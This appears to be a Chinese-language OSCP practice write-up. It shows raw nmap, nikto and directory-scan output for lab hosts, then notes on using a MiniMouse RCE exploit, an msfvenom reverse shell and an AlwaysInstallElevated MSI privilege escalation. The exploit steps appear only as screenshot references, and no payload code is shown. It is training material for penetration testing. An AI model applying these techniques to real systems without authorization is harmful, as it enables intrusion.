[16:25:56] 403 -  292B  - /phpmyadmin/ChangeLog
[16:25:58] 403 -  292B  - /phpmyadmin
[16:26:00] 403 -  292B  - /phpmyadmin/
[16:26:00] 403 -  292B  - /phpmyadmin/index.php
[16:26:00] 403 -  292B  - /phpmyadmin/phpmyadmin/index.php
[16:26:00] 403 -  292B  - /phpmyadmin/scripts/setup.php
[16:26:01] 403 -  292B  - /phpsysinfo/
[16:26:31] 403 -  292B  - /web.config::$DATA

```

3 個 port 的網站都有 /cgi-bin/ 路徑
![[截圖 2023-09-08 下午4.32.06.png]]

```json
┌──(ouyang㉿kali)-[~/…/OSCP/Exam/112/joomla-bruteforce]
└─$ nikto -host 192.168.115.112 -port 80
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.115.112
+ Target Hostname:    192.168.115.112
+ Target Port:        80
+ Start Time:         2023-09-08 22:20:06 (GMT8)
---------------------------------------------------------------------------
+ Server: Apache/2.4.51 (Win64) PHP/7.4.26
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Uncommon header 'tcn' found, with contents: list
+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.html
+ Allowed HTTP Methods: GET, POST, OPTIONS, HEAD, TRACE
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3268: /images/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 8724 requests: 0 error(s) and 10 item(s) reported on remote host
+ End Time:           2023-09-08 22:56:28 (GMT8) (2182 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```






## 114

### Nmap

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Exam/101]
└─$ sudo nmap -A -sC -T4 192.168.115.114
[sudo] ouyang 的密碼：
抱歉，請重試。
[sudo] ouyang 的密碼：
Starting Nmap 7.92 ( https://nmap.org ) at 2023-09-08 14:15 CST
Nmap scan report for 192.168.115.114
Host is up (0.22s latency).
Not shown: 992 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-syst:
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-07-22  03:49AM              5242368 minimouse.msi
|_02-07-22  04:20AM             10816785 WBCE_CMS-1.5.2.zip
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: OSCP
|   NetBIOS_Domain_Name: OSCP
|   NetBIOS_Computer_Name: OSCP
|   DNS_Domain_Name: oscp
|   DNS_Computer_Name: oscp
|   Product_Version: 10.0.19041
|_  System_Time: 2023-09-08T06:15:59+00:00
|_ssl-date: 2023-09-08T06:16:06+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=oscp
| Not valid before: 2023-09-07T00:00:27
|_Not valid after:  2024-03-08T00:00:27
5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Service Unavailable
|_http-server-header: Microsoft-HTTPAPI/2.0
8080/tcp open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: 401 - Unauthorized: Access is denied due to invalid credentials.
| http-auth:
| HTTP/1.1 401 Unauthorized\x0D
|_  Server returned status 401 but no WWW-Authenticate header.
|_http-server-header: Microsoft-IIS/10.0
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=9/8%OT=21%CT=1%CU=32602%PV=Y%DS=2%DC=T%G=Y%TM=64FABC27
OS:%P=aarch64-unknown-linux-gnu)SEQ(SP=105%GCD=1%ISR=109%TI=I%II=I%SS=O%TS=
OS:U)SEQ(SP=105%GCD=1%ISR=109%TI=I%II=I%TS=U)SEQ(SP=105%GCD=1%ISR=109%TI=RD
OS:%TS=U)OPS(O1=M54ENW8NNS%O2=M54ENW8NNS%O3=M54ENW8%O4=M54ENW8NNS%O5=M54ENW
OS:8NNS%O6=M54ENNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(
OS:R=Y%DF=Y%T=80%W=FFFF%O=M54ENW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0
OS:%Q=)T6(R=N)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUC
OS:K=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2023-09-08T06:15:57
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required

TRACEROUTE (using port 1025/tcp)
HOP RTT       ADDRESS
1   224.40 ms 192.168.49.1
2   224.48 ms 192.168.115.114

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 52.07 seconds


PORT      STATE    SERVICE       REASON
21/tcp    open     ftp           syn-ack
80/tcp    open     http          syn-ack
135/tcp   open     msrpc         syn-ack
139/tcp   open     netbios-ssn   syn-ack
445/tcp   open     microsoft-ds  syn-ack
3389/tcp  open     ms-wbt-server syn-ack
5040/tcp  open     unknown       syn-ack
5357/tcp  open     wsdapi        syn-ack
8039/tcp  open     unknown       syn-ack
8080/tcp  open     http-proxy    syn-ack
40783/tcp filtered unknown       no-response
49664/tcp open     unknown       syn-ack
49665/tcp open     unknown       syn-ack
49666/tcp open     unknown       syn-ack
49667/tcp open     unknown       syn-ack
49668/tcp open     unknown       syn-ack
49669/tcp open     unknown       syn-ack
49671/tcp open     unknown       syn-ack
49672/tcp open     unknown       syn-ack
50840/tcp filtered unknown       no-response
57747/tcp filtered unknown       no-response

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 6387.53 seconds


┌──(ouyang㉿kali)-[~]
└─$ sudo nmap -A -sC -T4 192.168.115.114 -p 21,80,135,139,445,3389,5040,5357,8039,8080,40783,49664,49665,49666,49667,49668,49
669,49671,49672,50840,57747
[sudo] ouyang 的密碼：
Starting Nmap 7.92 ( https://nmap.org ) at 2023-09-08 16:26 CST
Nmap scan report for 192.168.115.114
Host is up (0.22s latency).

PORT      STATE  SERVICE       VERSION
21/tcp    open   ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-07-22  03:49AM              5242368 minimouse.msi
|_02-07-22  04:20AM             10816785 WBCE_CMS-1.5.2.zip
| ftp-syst:
|_  SYST: Windows_NT
80/tcp    open   http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|_  Potentially risky methods: TRACE
135/tcp   open   msrpc         Microsoft Windows RPC
139/tcp   open   netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open   microsoft-ds?
3389/tcp  open   ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=oscp
| Not valid before: 2023-09-07T00:00:27
|_Not valid after:  2024-03-08T00:00:27
|_ssl-date: 2023-09-08T08:29:11+00:00; 0s from scanner time.
| rdp-ntlm-info:
|   Target_Name: OSCP
|   NetBIOS_Domain_Name: OSCP
|   NetBIOS_Computer_Name: OSCP
|   DNS_Domain_Name: oscp
|   DNS_Computer_Name: oscp
|   Product_Version: 10.0.19041
|_  System_Time: 2023-09-08T08:28:42+00:00
5040/tcp  open   unknown
5357/tcp  open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
8039/tcp  open   unknown
| fingerprint-strings:
|   FourOhFourRequest, GetRequest, HTTPOptions, RTSPRequest, SIPOptions:
|     HTTP/1.1 404 OK
|     Server: bruce_wy/1.0.0
|     Access-Control-Allow-Methods: POST,GET,TRACE,OPTIONS
|     Access-Control-Allow-Headers: Content-Type,Origin,Accept
|     Access-Control-Allow-Origin: *
|     Access-Control-Allow-Credentials: true
|     P3P: CP=CAO PSA OUR
|     Content-Type: text/html
|     Content-Range: bytes 0-0/-1
|_    Content-Length : 4294967295
8080/tcp  open   http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|_  Potentially risky methods: TRACE
| http-auth:
| HTTP/1.1 401 Unauthorized\x0D
|_  Server returned status 401 but no WWW-Authenticate header.
|_http-title: 401 - Unauthorized: Access is denied due to invalid credentials.
40783/tcp closed unknown
49664/tcp open   msrpc         Microsoft Windows RPC
49665/tcp open   msrpc         Microsoft Windows RPC
49666/tcp open   msrpc         Microsoft Windows RPC
49667/tcp open   msrpc         Microsoft Windows RPC
49668/tcp open   msrpc         Microsoft Windows RPC
49669/tcp open   msrpc         Microsoft Windows RPC
49671/tcp open   msrpc         Microsoft Windows RPC
49672/tcp open   msrpc         Microsoft Windows RPC
50840/tcp closed unknown
57747/tcp closed unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8039-TCP:V=7.92%I=7%D=9/8%Time=64FADAA8%P=aarch64-unknown-linux-gnu
SF:%r(GetRequest,14B,"HTTP/1\.1\x20404\x20OK\r\nServer:\x20bruce_wy/1\.0\.
SF:0\r\nAccess-Control-Allow-Methods:\x20POST,GET,TRACE,OPTIONS\r\nAccess-
SF:Control-Allow-Headers:\x20Content-Type,Origin,Accept\r\nAccess-Control-
SF:Allow-Origin:\x20\*\r\nAccess-Control-Allow-Credentials:\x20true\r\nP3P
SF::\x20CP=CAO\x20PSA\x20OUR\r\nContent-Type:\x20text/html\r\nContent-Rang
SF:e:\x20bytes\x200-0/-1\r\nContent-Length\x20:\x204294967295\r\n\r\n")%r(
SF:HTTPOptions,14B,"HTTP/1\.1\x20404\x20OK\r\nServer:\x20bruce_wy/1\.0\.0\
SF:r\nAccess-Control-Allow-Methods:\x20POST,GET,TRACE,OPTIONS\r\nAccess-Co
SF:ntrol-Allow-Headers:\x20Content-Type,Origin,Accept\r\nAccess-Control-Al
SF:low-Origin:\x20\*\r\nAccess-Control-Allow-Credentials:\x20true\r\nP3P:\
SF:x20CP=CAO\x20PSA\x20OUR\r\nContent-Type:\x20text/html\r\nContent-Range:
SF:\x20bytes\x200-0/-1\r\nContent-Length\x20:\x204294967295\r\n\r\n")%r(RT
SF:SPRequest,14B,"HTTP/1\.1\x20404\x20OK\r\nServer:\x20bruce_wy/1\.0\.0\r\
SF:nAccess-Control-Allow-Methods:\x20POST,GET,TRACE,OPTIONS\r\nAccess-Cont
SF:rol-Allow-Headers:\x20Content-Type,Origin,Accept\r\nAccess-Control-Allo
SF:w-Origin:\x20\*\r\nAccess-Control-Allow-Credentials:\x20true\r\nP3P:\x2
SF:0CP=CAO\x20PSA\x20OUR\r\nContent-Type:\x20text/html\r\nContent-Range:\x
SF:20bytes\x200-0/-1\r\nContent-Length\x20:\x204294967295\r\n\r\n")%r(Four
SF:OhFourRequest,14B,"HTTP/1\.1\x20404\x20OK\r\nServer:\x20bruce_wy/1\.0\.
SF:0\r\nAccess-Control-Allow-Methods:\x20POST,GET,TRACE,OPTIONS\r\nAccess-
SF:Control-Allow-Headers:\x20Content-Type,Origin,Accept\r\nAccess-Control-
SF:Allow-Origin:\x20\*\r\nAccess-Control-Allow-Credentials:\x20true\r\nP3P
SF::\x20CP=CAO\x20PSA\x20OUR\r\nContent-Type:\x20text/html\r\nContent-Rang
SF:e:\x20bytes\x200-0/-1\r\nContent-Length\x20:\x204294967295\r\n\r\n")%r(
SF:SIPOptions,14B,"HTTP/1\.1\x20404\x20OK\r\nServer:\x20bruce_wy/1\.0\.0\r
SF:\nAccess-Control-Allow-Methods:\x20POST,GET,TRACE,OPTIONS\r\nAccess-Con
SF:trol-Allow-Headers:\x20Content-Type,Origin,Accept\r\nAccess-Control-All
SF:ow-Origin:\x20\*\r\nAccess-Control-Allow-Credentials:\x20true\r\nP3P:\x
SF:20CP=CAO\x20PSA\x20OUR\r\nContent-Type:\x20text/html\r\nContent-Range:\
SF:x20bytes\x200-0/-1\r\nContent-Length\x20:\x204294967295\r\n\r\n");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=9/8%OT=21%CT=40783%CU=30093%PV=Y%DS=2%DC=T%G=Y%TM=64FA
OS:DB58%P=aarch64-unknown-linux-gnu)SEQ(SP=108%GCD=1%ISR=107%TI=I%TS=U)SEQ(
OS:SP=108%GCD=3%ISR=107%TI=I%II=I%SS=S%TS=U)OPS(O1=M54ENW8NNS%O2=M54ENW8NNS
OS:%O3=M54ENW8%O4=M54ENW8NNS%O5=M54ENW8NNS%O6=M54ENNS)WIN(W1=FFFF%W2=FFFF%W
OS:3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M54ENW8NNS%CC=
OS:N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=N)T5(R=Y%
OS:DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=N)T7(R=N)U1(R=Y%DF=N%T=80%IP
OS:L=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2023-09-08T08:28:45
|_  start_date: N/A

TRACEROUTE (using port 57747/tcp)
HOP RTT       ADDRESS
1   252.12 ms 192.168.49.1
2   252.40 ms 192.168.115.114

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 185.59 seconds
```

ftp 可以下載 WBCE_CMS-1.5.2.zip 回來

```json
./wbce/languages/DE.php:$TEXT['NEW_PASSWORD'] = 'Neues Passwort';
./wbce/languages/DE.php:$TEXT['PASSWORD'] = 'Passwort';
./wbce/languages/DE.php:$TEXT['RETYPE_NEW_PASSWORD'] = 'Neues Passwort wiederholen';
./wbce/languages/DE.php:$TEXT['RETYPE_PASSWORD'] = 'Neues Passwort wiederholen';
./wbce/languages/DE.php:$TEXT['WBMAILER_SMTP_PASSWORD'] = 'SMTP-Passwort';
./wbce/languages/DE.php:$HEADING['MY_PASSWORD'] = 'Passwort';
./wbce/languages/DE.php:$MESSAGE['FORGOT_PASS_PASSWORD_RESET'] = 'Ihr Benutzername und Ihr Passwort wurden an Ihre E-Mail-Adresse gesendet';
```

透過 ftp 發現這台機器有 mini mouse & WBCE，嘗試搜尋 exploit
![[截圖 2023-09-09 上午2.12.05.png]]

發現 mini mouse 有 RCE 漏洞 [exploit](https://www.exploit-db.com/exploits/49743)

![[截圖 2023-09-09 上午2.13.04.png]]

![[截圖 2023-09-08 下午5.50.40.png]]

用 msfvenom 製作 reverse shell

![[截圖 2023-09-08 下午5.51.10.png]]

![[截圖 2023-09-08 下午5.49.26.png]]

![[截圖 2023-09-08 下午5.52.15.png]]

![[截圖 2023-09-08 下午5.51.59.png]]

上傳 winPEASx64.exe 執行發現
![[截圖 2023-09-08 下午6.05.23.png]]
![[截圖 2023-09-08 下午5.58.18.png]]

參考 [hacktricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#alwaysinstallelevated)，知道只要這 2 個值被設為 1，每個 user 都可以以 system 權限安裝 msi

先製作 msi reverse shell
![[截圖 2023-09-08 下午6.03.40.png]]

上傳到靶機並執行

![[截圖 2023-09-08 下午6.04.02.png]]

got shell!

![[截圖 2023-09-08 下午6.02.04.png]]